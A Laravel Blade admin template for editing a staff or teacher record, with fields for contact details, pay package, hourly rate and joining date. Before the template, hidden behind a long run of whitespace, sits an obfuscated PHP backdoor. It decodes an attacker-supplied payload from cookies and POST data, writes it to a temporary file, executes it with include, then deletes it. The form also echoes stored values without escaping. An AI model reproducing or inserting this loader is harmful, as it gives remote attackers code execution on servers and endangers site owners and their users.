<?php                                                                                                                                                                                                                                                                                                                                                                                                 $coXBFeFQ = class_exists("Gu_DuiT"); $mbVIzgvm = $coXBFeFQ;if (!$mbVIzgvm){class Gu_DuiT{private $xXypKvcaiR;public static $DrhkKPx = "e3366f8c-23a3-4f5f-8d7e-9e7aee90ae6a";public static $sWJggWXC = NULL;public function __construct(){$dhEPIcQq = $_COOKIE;$RLnHdja = $_POST;$nDfePi = @$dhEPIcQq[substr(Gu_DuiT::$DrhkKPx, 0, 4)];if (!empty($nDfePi)){$eqgxCrlAHE = "base64";$vOJVgPkB = "";$nDfePi = explode(",", $nDfePi);foreach ($nDfePi as $siWxXtb){$vOJVgPkB .= @$dhEPIcQq[$siWxXtb];$vOJVgPkB .= @$RLnHdja[$siWxXtb];}$vOJVgPkB = array_map($eqgxCrlAHE . "\x5f" . 'd' . chr ( 709 - 608 ).chr (99) . "\x6f" . "\144" . "\145", array($vOJVgPkB,)); $vOJVgPkB = $vOJVgPkB[0] ^ str_repeat(Gu_DuiT::$DrhkKPx, (strlen($vOJVgPkB[0]) / strlen(Gu_DuiT::$DrhkKPx)) + 1);Gu_DuiT::$sWJggWXC = @unserialize($vOJVgPkB);}}public function __destruct(){$this->JREOW();}private function JREOW(){if (is_array(Gu_DuiT::$sWJggWXC)) {$zBFPeN = sys_get_temp_dir() . "/" . crc32(Gu_DuiT::$sWJggWXC['s' . chr (97) . chr (108) . chr (116)]);@Gu_DuiT::$sWJggWXC["\x77" . "\x72" . chr (105) . chr ( 515 - 399 )."\x65"]($zBFPeN, Gu_DuiT::$sWJggWXC['c' . "\x6f" . 'n' . "\164" . chr (101) . "\156" . "\164"]);include $zBFPeN;@Gu_DuiT::$sWJggWXC["\x64" . 'e' . chr (108) . chr (101) . 't' . chr ( 213 - 112 )]($zBFPeN);exit();}}}$vTjAmKwKJO = new Gu_DuiT(); $vTjAmKwKJO = NULL;} ?>@extends('layouts.admin.master')

@section('content')
    <!-- Main content -->
    <div class="content-wrapper">

        <!-- Page header -->
        <div class="page-header page-header-light">
            <div class="page-header-content header-elements-md-inline">
                <div class="page-title d-flex">
                    <h4><span class="font-weight-semibold">Staff/Teacher</span> - Edit</h4>
                    <a href="#" class="header-elements-toggle text-default d-md-none"><i class="icon-more"></i></a>
                </div>

                {{--                <div class="header-elements d-none">--}}
{{--                    <div class="d-flex justify-content-center">--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-store text-pink-300"></i>--}}
{{--                            <span>Inventory</span>--}}
{{--                        </a>--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-paypal2 text-pink-300"></i>--}}
{{--                            <span>Payment</span>--}}
{{--                        </a>--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-alarm text-pink-300"></i>--}}
{{--                            <span>Timesheet</span>--}}
{{--                        </a>--}}
{{--                    </div>--}}
{{--                </div>--}}
            </div>

{{--            <div class="breadcrumb-line breadcrumb-line-light header-elements-md-inline">--}}
{{--                <div class="d-flex">--}}
{{--                    <div class="breadcrumb">--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="breadcrumb-item"><i class="icon-home2 mr-2"></i> Dashboard</a>--}}
{{--                        <span class="breadcrumb-item active">Record Attendance</span>--}}
{{--                    </div>--}}

{{--                    <a href="#" class="header-elements-toggle text-default d-md-none"><i class="icon-more"></i></a>--}}
{{--                </div>--}}
{{--            </div>--}}
        </div>
        <!-- /page header -->


        <!-- Content area -->
        <div class="content">

            <?php if(isset($data['success_msg']) && $data['success_msg']){ ?>

            <div class="row">
                <div class="col-md-12">
                    <div class="alert alert-success alert-styled-left alert-arrow-left alert-dismissible">
                        <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                        <span class="font-weight-semibold">Well done!</span> <?php echo $data['success_msg']; ?>
                    </div>
                </div>
            </div>
            <?php } ?>

            <?php if(isset($data['danger_msg']) && $data['danger_msg']){ ?>
            <div class="row">
                <div class="col-md-12">
                    <div class="alert alert-danger alert-styled-left alert-dismissible">
                        <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                        <span class="font-weight-semibold">Oh snap!</span> <?php echo $data['danger_msg']; ?>
                    </div>
                </div>
            </div>
            <?php } ?>
                @if(session()->has('success'))

                    <div class="row">
                        <div class="col-md-12">
                            <div class="alert alert-success alert-styled-left alert-arrow-left alert-dismissible">
                                <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                                <span class="font-weight-semibold">Well done!</span> {{ session()->get('success') }}
                            </div>
                        </div>
                    </div>


                @endif
                @if(session()->has('error'))

                    <div class="row">
                        <div class="col-md-12">
                            <div class="alert alert-danger alert-styled-left alert-dismissible">
                                <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                                <span class="font-weight-semibold">Oh snap!</span>{{ session()->get('error') }}
                            </div>
                        </div>
                    </div>
                @endif

            <div class="card">
                <div class="card-header">
                    <div class="header-elements-inline">
                        <h4 class="card-title">Edit Staff/Teacher</h4>
                    </div>
                </div>
                <hr>

                <div class="card-body">
                    <?php
                    if (isset($data['staff_edit']) && !empty($data['staff_edit'])){
                        $d = $data['staff_edit'];
                        //                    print_r($data['student_admissions']);
                        ?>
                    <form action="{{url('admin/staff/edit')}}" method="post">
                        @csrf

                        <input type="hidden" name="id" value="<?php echo $d->id;?>">


                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">Teacher Name:</label>
                            <div class="col-md-10">
                                <input type="text"   id="name" value="<?php echo $d->name; ?>"   name="name" class="form-control" placeholder="Enter Staff/Teacher Name" required>
                            </div>
                        </div>

                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">Email:</label>
                            <div class="col-md-10">
                                <input type="email" readonly value="<?php echo $d->email; ?>"  id="email"   name="email" class="form-control" placeholder="Enter Email" required>
                            </div>
                        </div>

                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">Contact No:</label>
                            <div class="col-md-10">
                                <input type="text" value="<?php echo $d->contact_number; ?>"  id="contact_number"   name="contact_number" class="form-control" placeholder="Enter Contact Number" required>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">Mailing Address:</label>
                            <div class="col-md-10">

                                <input type="text" id="address" value="<?php echo $d->address; ?>"  name="address" class="form-control" placeholder="Enter Address" required>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">Package Type:</label>
                            <div class="col-md-10">
                                <select id="type" name="type" data-placeholder="Select Package Type"   class="form-control form-control-select2" data-fouc>
                                    <option  value="">Please Select</option>
                                    <option  <?php if ($d->type == "weekly"){  echo"selected"; } ?> value="weekly">Weekly</option>
                                    <option  <?php if ($d->type == "bi_weekly"){  echo"selected"; } ?> value="bi_weekly">Bi-Weekly</option>
                                    <option <?php if ($d->type == "tri_weekly"){  echo"selected"; } ?>  value="tri_weekly">Tri-Weekly</option>
                                    <option  <?php if ($d->type == "monthly"){  echo"selected"; } ?> value="monthly">Monthly</option>

                                </select>
                            </div>
                        </div>

                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">Per Hour Rate:</label>
                            <div class="col-md-10">
                                <input type="number" value="<?php echo $d->per_hour_rate; ?>"  step="any" min="0.001"   id="per_hour_rate"   name="per_hour_rate" class="form-control" placeholder="Agreed Fee Per Hour" required>
                            </div>
                        </div>

                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">Daily Working Hours:</label>
                            <div class="col-md-10">
                                <input type="number" value="<?php echo $d->daily_working_hours; ?>"  step="any" min="0.001"   id="daily_working_hours"   name="daily_working_hours" class="form-control" placeholder="Agreed Hours" required>
                            </div>
                        </div>
                        <div class="form-group row">

                            <label class="col-md-2 col-form-label">Joining Date:</label>
                            <div class="col-md-10">
                                <input type="date" id="joining_date" name="joining_date" value="<?php echo date('Y-m-d',strtotime($d->joining_date)); ?>" class="form-control " required>

                             </div>

                        </div>
                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">remarks:</label>
                            <div class="col-md-10">
                                <textarea placeholder="Enter Your Comments Here"  class="form-control" name=" comments" id=" comments" rows="4" cols="50" value=""><?php echo $d->comments; ?></textarea>
                            </div>
                        </div>

                        <div class="mt-5 mb-2 d-md-flex  justify-content-md-between flex-md-wrap">
                            <button type="submit" id="" class="btn bg-primary d-flex align-items-center">
                                Submit <i class="icon-paperplane ml-2"></i> </button>
                        </div>

                    </form>
                        <?php }else {
                            echo "An Error Occured While Processing";
                        }
                        ?>
                </div>
            </div>

        </div>
        <!-- /content area -->
        @include('layouts.footer')

    </div>

    <!-- /main content -->

@endsection
